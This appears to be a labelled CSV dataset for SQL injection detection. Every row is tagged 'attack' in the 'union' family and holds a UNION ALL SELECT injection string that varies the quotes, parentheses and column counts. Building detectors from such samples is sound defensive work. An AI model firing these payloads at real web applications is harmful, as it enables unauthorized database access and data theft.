label,payload,family
attack,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",union
attack,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",union
attack,"1' where 2774  =  2774 union all select null,null,null,null,null#",union
attack,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",union
attack,"-8073   )    )     )   union all select 4481,4481,4481,4481--",union
attack,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",union
attack,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",union
attack,"1%""   )    )    union all select null,null,null,null,null--",union
attack,"1'  )   where 8268  =  8268 union all select null,null,null,null--",union
attack,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",union
attack,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",union
attack,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null#",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null--",union
attack,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",union
attack,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",union
attack,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",union
attack,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",union
attack,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",union
attack,"-4711%""   )    )    union all select 6737,6737,6737,6737#",union
attack,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",union
